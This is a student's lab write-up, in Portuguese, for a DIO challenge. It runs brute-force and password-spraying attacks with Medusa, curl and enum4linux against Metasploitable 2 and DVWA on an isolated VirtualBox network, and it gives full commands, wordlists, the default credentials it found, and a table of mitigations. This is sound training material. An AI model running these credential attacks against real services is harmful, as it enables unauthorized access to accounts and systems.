# 🔐 Desafio DIO — Força Bruta com Medusa em Ambiente Controlado

Repositório de documentação e evidências do projeto prático proposto pela DIO:
**Implementar, documentar e compartilhar um projeto utilizing Kali Linux e Medusa**,
com ambientes vulneráveis (Metasploitable 2 / DVWA) para simular ataques de força bruta
e exercitar medidas de prevenção.

> ⚠️ **Aviso ético:** todos os testes foram executados **exclusivamente** em máquinas
> virtuais isoladas em rede **Host-Only**, de propriedade do autor, para fins de estudo.
> Não utilize estas técnicas em sistemas de terceiros sem autorização formal.

---

## 📋 Índice

1. [Visão geral do desafio](#1-visão-geral-do-desafio)
2. [Ambiente utilizado](#2-ambiente-utilizado)
3. [Guia passo a passo — iniciando as VMs](#3-guia-passo-a-passo--iniciando-as-vms)
4. [Configuração de rede (Host-Only)](#4-configuração-de-rede-host-only)
5. [Descoberta e enumeração](#5-descoberta-e-enumeração)
6. [Cenário 1 — Força bruta FTP com Medusa](#6-cenário-1--força-bruta-ftp-com-medusa)
7. [Cenário 2 — Automação web em DVWA](#7-cenário-2--automação-web-em-dvwa)
8. [Cenário 3 — Password spraying SMB com enumeração de usuários](#8-cenário-3--password-spraying-smb-com-enumeração-de-usuários)
9. [Estrutura de evidências](#9-estrutura-de-evidências)
10. [Documentação em Gherkin](#10-documentação-em-gherkin)
11. [Mitigações recomendadas](#11-mitigações-recomendadas)
12. [Conclusão e aprendizados](#12-conclusão-e-aprendizados)

---

## 1. Visão geral do desafio

O desafio pede três frentes de ataque simulado:

| # | Cenário | Ferramenta | Alvo |
|---|---------|------------|------|
| 1 | Força bruta em FTP | Medusa | vsFTPd 2.3.4 (porta 21) |
| 2 | Automação de tentativas em formulário web | Medusa (módulo HTTP) / curl | DVWA (porta 80) |
| 3 | Password spraying em SMB com enumeração de usuários | Medusa + enum4linux/smbclient | Samba (porta 445) |

Além disso, exige:

- configurar **duas VMs** no VirtualBox com rede interna (host-only);
- criar **wordlists simples**;
- registrar **comandos**, **validação de acessos** e **recomendações de mitigação**;
- publicar tudo em um repositório público com `README.md` e evidências em `/images`.

---

## 2. Ambiente utilizado

**Host (Windows):**

| Item | Valor |
|------|-------|
| Sistema | Windows (PowerShell) |
| VirtualBox | 7.2.22r175245 |
| Adaptador Host-Only | VirtualBox Host-Only Ethernet Adapter — `192.168.56.1/24` (DHCP desligado) |

**Máquinas virtuais registradas:**

| VM | Estado inicial | Placa 1 | Observação |
|----|----------------|---------|------------|
| `kali-linux-2026.3-virtualbox-amd64` | poweroff | hostonly | Atacante — Kali Linux |
| `Metasploitabl` | poweroff | hostonly | Alvo — Metasploitable 2 |
| `Windows 10` | poweroff | nat | VM extra (fora do escopo do ataque) |
| `Kali iso` | poweroff | nat | VM de instalação (ISO do Kali) |

**Mapeamento de IPs descoberto via ARP/ping após iniciar as VMs:**

| IP | MAC | Identidade |
|----|-----|------------|
| `192.168.56.1` | 0a:00:27:00:00:0b | Host (adaptador VirtualBox) |
| `192.168.56.100` | 08:00:27:C4:59:08 | Dispositivo adicional na rede |
| `192.168.56.101` | 08:00:27:81:BF:53 | **Metasploitable 2 (alvo)** |
| `192.168.56.102` | 08:00:27:C3:FB:76 | **Kali Linux (atacante)** |

---

## 3. Guia passo a passo — iniciando as VMs

Você pode fazer tudo pela interface gráfica ou pela linha de comando. Estes são os
dois caminhos, na ordem em que foram executados neste projeto.

### Passo 1 — Abrir o VirtualBox e conferir as VMs

1. Abra o **Oracle VirtualBox Manager**.
2. No painel esquerdo confira que existem as VMs `kali-linux-...`, `Metasploitabl`,
   `Windows 10` e `Kali iso`.
3. Verifique o estado: todas iniciam **desligadas (poweroff)**.

Equivalente por comando (PowerShell):

```powershell
& 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' list vms
& 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' list runningvms
```

### Passo 2 — Iniciar as VMs do desafio

Pela interface: selecione `kali-linux-...` → **Iniciar (Start)**; repita para
`Metasploitabl`.

Pela linha de comando (modo headless, sem abrir janela):

```powershell
$vbox = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe'
& $vbox startvm 'kali-linux-2026.3-virtualbox-amd64' --type headless
& $vbox startvm 'Metasploitabl' --type headless
& $vbox list runningvms
```

> 💡 **Dica:** se preferir enxergar o desktop do Kali, troque `--type headless`
> por `--type gui`. As ISOs de Windows 10 e Kali já estão registradas como VMs;
> para "iniciar a ISO" basta dar Start na VM correspondente. O Windows 10 e a
> `Kali iso` **não participam dos ataques** — ficam em NAT e servem apenas como
> referência/estudo.

### Passo 3 — Confirmar que as VMs subiram

```powershell
& $vbox showvminfo 'kali-linux-2026.3-virtualbox-amd64' --machinereadable | Select-String 'VMState'
& $vbox showvminfo 'Metasploitabl' --machinereadable | Select-String 'VMState'
# Saída esperada: VMState="running"
```

### Passo 4 — Acessar o terminal do Kali

- Pelo VirtualBox: clique na VM Kali → **Mostrar (Show)** → login padrão
  `kali` / `kali`.
- Ou via SSH, se o serviço estiver ativo: `ssh kali@192.168.56.102`.

No Kali, confirme seu IP:

```bash
ip a s eth0 | grep 'inet '
# 192.168.56.102/24
```

---

## 4. Configuração de rede (Host-Only)

As VMs já estavam com `nic1=hostonly`, ligadas ao adaptador
`VirtualBox Host-Only Ethernet Adapter` (`192.168.56.1/24`, DHCP desativado).
Se precisar refazer do zero:

```powershell
# 1) Criar o adaptador (se não existir)
& $vbox hostonlyif create

# 2) Configurar IP do host
& $vbox hostonlyif ipconfig 'VirtualBox Host-Only Ethernet Adapter' --ip 192.168.56.1 --netmask 255.255.255.0

# 3) Anexar as duas VMs ao adaptador
& $vbox modifyvm 'kali-linux-2026.3-virtualbox-amd64' --nic1 hostonly --hostonlyadapter1 'VirtualBox Host-Only Ethernet Adapter'
& $vbox modifyvm 'Metasploitabl' --nic1 hostonly --hostonlyadapter1 'VirtualBox Host-Only Ethernet Adapter'
```

> ❗ **Importante:** rede Host-Only é isolada — o Kali **não tem internet** por
> essa placa. Isso é desejável: nenhum pacote de ataque sai para a rede real.
> Se precisar baixar algo, use uma segunda placa em NAT e desative-a depois.

### ⚠️ Problema comum: o Kali apareceu com `10.0.2.15/24`

Se o `ip a` mostrar `inet 10.0.2.15/24`, você entrou na VM **`Kali iso`**, que
está com a placa em **NAT**. NAT (`10.0.2.0/24`) e Host-Only (`192.168.56.0/24`)
são redes **diferentes e não se comunicam** — por isso o `ping 192.168.56.101`
falha. Confira com:

```powershell
& $vbox showvminfo 'Kali iso' --machinereadable | Select-String '^(nic1|VMState)='
# nic1="nat"
```

**Solução A (recomendada) — usar a VM já preparada para o laboratório:**

```powershell
& $vbox startvm 'kali-linux-2026.3-virtualbox-amd64' --type gui
```

Essa VM já tem `nic1="hostonly"` e herdou o IP **`192.168.56.102`**.
É nela que os comandos Medusa devem ser executados.

**Solução B — manter a VM da ISO e acrescentar uma placa Host-Only:**

1. Desligue a VM `Kali iso` (mudanças de rede exigem VM parada);
2. Execute:

```powershell
& $vbox modifyvm 'Kali iso' --nic2 hostonly --hostonlyadapter2 'VirtualBox Host-Only Ethernet Adapter'
& $vbox startvm 'Kali iso' --type gui
```

3. Dentro do Kali:

```bash
ip a
# eth0: 10.0.2.15/24   (NAT — internet)
# eth1: 192.168.56.x   (Host-Only — laboratório)
ping 192.168.56.101
nmap -sn 192.168.56.0/24
```

---

## 5. Descoberta e enumeração

### 5.1 Descobrir o IP do alvo (a partir do host Windows)

```powershell
# Varredura ICMP na rede host-only
$jobs = 1..254 | ForEach-Object {
  $ip = "192.168.56.$_"
  Start-Job -ScriptBlock {
    param($t)
    $p = New-Object System.Net.NetworkInformation.Ping
    $r = $p.Send($t, 300)
    if ($r.Status -eq 'Success') { $t }
  } -ArgumentList $ip
}
$jobs | Wait-Job | Receive-Job
$jobs | Remove-Job
```

Resultado real obtido:

```text
192.168.56.1   (host)
192.168.56.100 (dispositivo adicional)
192.168.56.101 (Metasploitable 2)
192.168.56.102 (Kali Linux)
```

### 5.2 Correlacionar IP ↔ MAC

```powershell
Get-NetNeighbor -AddressFamily IPv4 |
  Where-Object { $_.IPAddress -like '192.168.56.*' } |
  Select-Object IPAddress, LinkLayerAddress, State
```

Compare com o MAC de cada VM:

```powershell
& $vbox showvminfo 'Metasploitabl' --machinereadable | Select-String 'macaddress1='
```

### 5.3 Scan de portas (a partir do Kali)

```bash
nmap -sV -Pn 192.168.56.101
```

Portas confirmadas neste ambiente (via teste de conexão TCP):

```text
21/tcp   open   ftp       vsFTPd 2.3.4
22/tcp   open   ssh
23/tcp   open   telnet
25/tcp   open   smtp
53/tcp   open   domain
80/tcp   open   http      Metasploitable2 (DVWA em /dvwa/)
111/tcp  open   rpcbind
139/tcp  open   netbios
445/tcp  open   microsoft-ds (Samba)
512/tcp  open   exec
513/tcp  open   login
514/tcp  open   shell
3306/tcp open   mysql
5432/tcp open   postgresql
5900/tcp open   vnc
6000/tcp open   X11
```

Evidência: [`images/03-portas-abertas.txt`](images/03-portas-abertas.txt)

### 5.4 Validar serviços

```powershell
# HTTP — página inicial do Metasploitable com link para DVWA
(Invoke-WebRequest 'http://192.168.56.101/' -UseBasicParsing).StatusCode  # 200

# FTP — banner e login anônimo
$c = New-Object Net.Sockets.TcpClient
$c.Connect('192.168.56.101', 21)
$r = New-Object IO.StreamReader($c.GetStream())
$r.ReadLine()   # 220 (vsFTPd 2.3.4)
$c.Close()
```

Evidência: [`images/02-servicos-validados.txt`](images/02-servicos-validados.txt)

---

## 6. Cenário 1 — Força bruta FTP com Medusa

**Objetivo:** obter acesso ao serviço FTP usando uma wordlist simples e o Medusa.

### 6.1 Criar wordlists

No Kali:

```bash
mkdir -p ~/desafio/wordlists
cat > ~/desafio/wordlists/users.txt <<'EOF'
anonymous
admin
msfadmin
root
user
guest
EOF

cat > ~/desafio/wordlists/passwords.txt <<'EOF'
password
123456
msfadmin
admin
toor
letmeout
EOF
```

Cópia destas wordlists neste repositório: [`wordlists/users.txt`](wordlists/users.txt)
e [`wordlists/passwords.txt`](wordlists/passwords.txt).

### 6.2 Executar o Medusa

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt \
       -M ftp -t 4 -T 10
```

Parâmetros:

| Flag | Significado |
|------|-------------|
| `-h` | host alvo |
| `-U` | arquivo de usuários |
| `-P` | arquivo de senhas |
| `-M ftp` | módulo FTP |
| `-t 4` | 4 threads por host |
| `-T 10` | 10 tentativas por conexão |

### 6.3 Validação encontrada

O Metasploitable aceita **login anônimo** — confirmado diretamente pelo host,
antes mesmo do ataque de força bruta:

```text
220 (vsFTPd 2.3.4)
331 Please specify the password.
230 Login successful.
215 UNIX Type: L8
```

> 🔎 **Resultado real da suíte:** o Medusa encontrou `msfadmin:msfadmin`
> `[SUCCESS]` e também confirmou `anonymous` com qualquer senha (login anônimo).
> O acesso com `msfadmin:msfadmin` foi validado com `pwd` e `ls` no diretório
> `/home/msfadmin`.

Evidências: [`images/04-medusa-ftp.txt`](images/04-medusa-ftp.txt),
[`images/11-ftp-anonimo.txt`](images/11-ftp-anonimo.txt),
[`images/12-ftp-msfadmin.txt`](images/12-ftp-msfadmin.txt)

---

## 7. Cenário 2 — Automação web em DVWA

**Objetivo:** automatizar tentativas de login no formulário web do DVWA.

### 7.1 Acessar

```
http://192.168.56.101/dvwa/
```

Credenciais padrão do DVWA: `admin` / `password`.
Nível de segurança padrão: **low**.

### 7.2 Automação com Medusa (módulo web-form) —limitacao identificada

```bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login Failed" \
  -m FORM-DATA:"post?username=&USERNAME&password=&PASSWORD" \
  -t 4
```

⚠️ **Limitação real encontrada:** o módulo `web-form` do Medusa 2.3 **não mantém
a sessão PHP do DVWA** entre as requisições. Sem a sessão, a página de login não
contém o `DENY-SIGNAL` e o Medusa classifica **todas** as tentativas como sucesso
— inclusive uma senha deliberadamente errada (`ERRADO`). Por isso **não** usei
essa saída como validação. O registro completo está em
`images/14-medusa-webform-observacao.txt`.

### 7.3 Automação válida com `curl` (usada na suíte)

Script executado dentro do Kali: `~/desafio/dvwa_web_brute.sh`. Para cada par
usuário/senha ele cria um **cookie jar novo**, envia o POST e segue o redirect:

```bash
rm -f /tmp/dvwa_try_cookies
curl -s -c /tmp/dvwa_try_cookies -o /dev/null "$BASE/login.php"
final=$(curl -s -L -b /tmp/dvwa_try_cookies -c /tmp/dvwa_try_cookies \
  -o /tmp/dvwa_try_body -w '%{url_effective}' \
  -d "username=$u&password=$p&Login=Login" "$BASE/login.php")
# URL final /index.php = login VALIDO; /login.php = falha
```

**Resultado real:** 36 tentativas, **1 credencial válida — `admin:password`**
(URL final `http://192.168.56.101/dvwa/index.php`).

Evidências: [`images/06-automacao-web-dvwa.txt`](images/06-automacao-web-dvwa.txt),
[`images/13-dvwa-curl.txt`](images/13-dvwa-curl.txt),
[`images/07-medusa-webform.png`](images/07-medusa-webform.png)

---

## 8. Cenário 3 — Password spraying SMB com enumeração de usuários

**Objetivo:** enumerar usuários do Samba e testar uma senha única contra várias
contas (password spraying), evitando bloqueio por tentativas repetidas na mesma conta.

### 8.1 Enumeração de usuários

No Kali:

```bash
enum4linux -U 192.168.56.101 | tee evidencias/enum4linux-usuarios.txt
# ou
smbclient -L //192.168.56.101 -N
```

Usuários típicos do Metasploitable 2: `msfadmin`, `user`, `postgres`, `service`,
`sys`, `backup`, `root`.

### 8.2 Password spraying com Medusa

```bash
#/users.txt = usuários enumerados
# spray.txt = uma única senha candidata
echo 'password' > wordlists/spray.txt

medusa -h 192.168.56.101 -U wordlists/users-enum.txt -P wordlists/spray.txt \
       -M smbnt -t 3
```

Para força bruta completa (mais ruidoso):

```bash
medusa -h 192.168.56.101 -U wordlists/users-enum.txt -P wordlists/passwords.txt \
       -M smbnt -t 4
```

> ⚠️ **Correção importante:** nesta instalação o módulo se chama **`smbnt`**.
> O comando `-M smb` falha com `Couldn't load "smb" [.../smb.mod: No such file]`.
> Veja a lista real com `medusa -d`.

**Resultado real do spray:** nenhuma conta usava a senha `password`. Em seguida,
um teste direto com `msfadmin:msfadmin` retornou
`ACCOUNT FOUND: [smbnt] ... User: msfadmin Password: msfadmin
[SUCCESS (ADMIN$ - Access Allowed)]`.

Evidências: [`images/07-medusa-smb-spray.txt`](images/07-medusa-smb-spray.txt),
[`images/15-medusa-smb-msfadmin.txt`](images/15-medusa-smb-msfadmin.txt)

### 8.3 Validação de acesso

```bash
smbclient //192.168.56.101/msfadmin -U msfadmin%msfadmin -c 'ls'
```

Se listar arquivos ⇒ credencial válida. Registre a saída em
`images/07-smb-acesso.txt`.

Evidência: [`images/07-smb-acesso.txt`](images/07-smb-acesso.txt)

---

## 9. Estrutura de evidências

```text
D:\Desafio Dio\
├── README.md                          ← documentação principal (este arquivo)
├── Entendendo o Desafio.md             ← enunciado original
├── GUERKIN.md / gherkin.feature        ← cenários em Gherkin
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
│   ├── spray.txt
│   └── users-enum.txt
└── images/                             ← evidências do passo a passo
    ├── 01-vms-iniciadas.txt
    ├── 02-servicos-validados.txt
    ├── 03-portas-abertas.txt
    ├── 04-medusa-ftp.txt
    ├── 05-dvwa-login.png
    ├── 06-medusa-webform.txt
    ├── 07-smb-acesso.txt
    └── 08-mitigacoes.md
```

> 📸 **Como capturar no VirtualBox:** com a VM em foco, use
> **Hóspede (Host) + Shift + S** (por padrão `Ctrl` é a tecla Host no Windows)
> para salvar uma captura de tela, ou use `Snipping Tool` do Windows para
> recortar o terminal e salvar em `images/`.

---

## 10. Documentação em Gherkin

O arquivo [`gherkin/desafio-medusa.feature`](gherkin/desafio-medusa.feature)
contém os cenários no formato **Given / When / Then**, prontos para leitura por
ferramentas BDD (Behave/Cucumber) e, principalmente, para documentar de forma
clara o que foi executado e o resultado esperado.

Exemplo resumido:

```gherkin
Feature: Auditoria de forca bruta com Medusa em ambiente controlado
  Como estudante de seguranca
  Quero validar a resistencia de servicos a ataques de forca bruta
  Para propor mitigacoes adequadas

  @ftp @medusa
  Scenario: Forca bruta bem sucedida em FTP com credencial fraca
    Given a VM Kali esteja conectada a rede host-only 192.168.56.0/24
    And o serviço FTP do Metasploitable esteja ativo na porta 21
    When executo "medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp"
    Then a credencial "msfadmin:msfadmin" deve ser aceita
    And o acesso deve ser registrado como evidencia
```

---

## 11. Mitigações recomendadas

| Ameaça | Mitigação |
|--------|-----------|
| Força bruta FTP | Desabilitar login anônimo; limite de tentativas (fail2ban); MFA; senhas fortes; desativar FTP em favor de SFTP |
| Login web DVWA sem limite | Rate limiting; CAPTCHA; bloqueio progressivo; logging e alerta; manter DVWA apenas em lab isolado |
| Password spraying SMB | Política de bloqueio de conta; monitorar eventos 4625; desabilitar SMBv1; MFA; senhas longas e únicas |
| Enumeração de usuários | Respostas genéricas de erro; desabilitar NetBIOS/SSR; firewall restrictivo |
| Rede host-only | Manter laboratório isolado; nunca expor VMs vulneráveis à internet |

---

## 12. Conclusão e aprendizados

- Aprendi a **iniciar e orquestrar VMs** no VirtualBox via `VBoxManage` e pela GUI.
- Entendi a importância da **rede Host-Only** para isolar um laboratório de ataques.
- Pratiquei **descoberta de hosts**, **scan de portas** e **correlação IP↔MAC**.
- Usei o **Medusa** para automatizar tentativas em três protocolos diferentes (FTP, HTTP, SMB).
- Documentei tudo com **Markdown** e **Gherkin**, criando um portfólio técnico verificável.
- Reforçei o lado **defensivo**: cada ataque executado tem uma mitigação correspondente.

---

## 13. Resultados reais da suíte executada (20/11/2026)

| ID | Caso de teste | Resultado | Evidência |
|----|---------------|-----------|-----------|
| CT-01 | VMs iniciadas | ✅ Passou | `images/01-vms-iniciadas.txt` |
| CT-02 | IP do Kali `192.168.56.102` | ✅ Passou | `images/10-ip-kali.txt` |
| CT-03 | Alvo `192.168.56.101` / MAC `08:00:27:81:BF:53` | ✅ Passou | `images/02-servicos-validados.txt` |
| CT-04 | Nmap: 21, 80, 445, 3306... | ✅ Passou | `images/09-nmap-kali.txt` |
| CT-05 | FTP anônimo `230 Login successful` | ✅ Passou | `images/11-ftp-anonimo.txt` |
| CT-06 | Medusa FTP: `msfadmin:msfadmin` | ✅ Passou | `images/04-medusa-ftp.txt` |
| CT-07 | DVWA: `admin:password` (URL final `/index.php`) | ✅ Passou | `images/13-dvwa-curl.txt` |
| CT-08 | Automação web: 36 tentativas, 1 válida | ✅ Passou | `images/06-automacao-web-dvwa.txt` |
| CT-09 | enum4linux: usuários enumerados | ✅ Passou | `images/08-enum4linux.txt` |
| CT-10 | SMB: `msfadmin:msfadmin` `[ADMIN$ - Access Allowed]` | ✅ Passou | `images/15-medusa-smb-msfadmin.txt` |
| CT-11 | smbclient: listagem do share | ✅ Passou | `images/07-smb-acesso.txt` |
| CT-12 | Documentação, planilha e pacote de entrega | ✅ Passou | `Desafio Entregar/` |

**Credenciais descobertas no laboratório**

| Serviço | Usuário | Senha | Observação |
|---------|---------|-------|------------|
| FTP | `anonymous` | qualquer | Login anônimo habilitado |
| FTP | `msfadmin` | `msfadmin` | Acesso ao `/home/msfadmin` |
| DVWA | `admin` | `password` | Redirect para `index.php` |
| SMB | `msfadmin` | `msfadmin` | `ADMIN$ - Access Allowed` |

**Ajustes técnicos aprendidos na execução**

1. O módulo SMB do Medusa nesta instalação é **`smbnt`** (`-M smb` falha).
2. O módulo `web-form` não preserva a sessão PHP do DVWA e gera falsos positivos;
   a automação válida foi feita com `curl` + cookie jar novo por tentativa.
3. O DVWA redireciona tanto sucesso quanto falha (302); o critério confiável é a
   **URL final** após `-L`: `/index.php` = válido, `/login.php` = inválido.

## 14. Automação visual para executar no VS Code / Cypress

Dentro de `Desafio Entregar/automacao/` deixei um projeto pronto:

```powershell
cd "D:\Desafio Dio\Desafio Entregar\automacao"
npm install
npm run open     # abre o Cypress com o terminal "digitando" os comandos
# ou
npm run run      # executa headless (validação: 2 testes, 11 capturas)
# alternativa sem Cypress:
python executar_vscode.py
```

O terminal exibe cada comando sendo digitado e, em seguida, ele é executado de
verdade no Kali (`VBoxManage guestcontrol`). Depois o DVWA é aberto, o login
`admin:password` é feito e as capturas são salvas em `images/` com prefixo
`cypress-`. A planilha tem as abas `Automacao Cypress` e `Capturas Cypress`.

### 📎 Como entregar

O pacote final está em **`Desafio Entregar/`**, com README, planilha, Gherkin,
wordlists, evidências textuais, capturas em PNG e o projeto de automação.

1. Entre em `Desafio Entregar/` e faça `git init`, `git add .`,
   `git commit -m "Desafio DIO - Medusa"`;
2. crie o repositório público no GitHub e `git remote add origin <url>`;
3. `git push -u origin main`;
4. cole o link do repositório no botão **Entregar Projeto** da DIO.

---

*Documentado em 20/11/2026 — ambiente VirtualBox 7.2.22, suíte completa executada com evidências reais.*
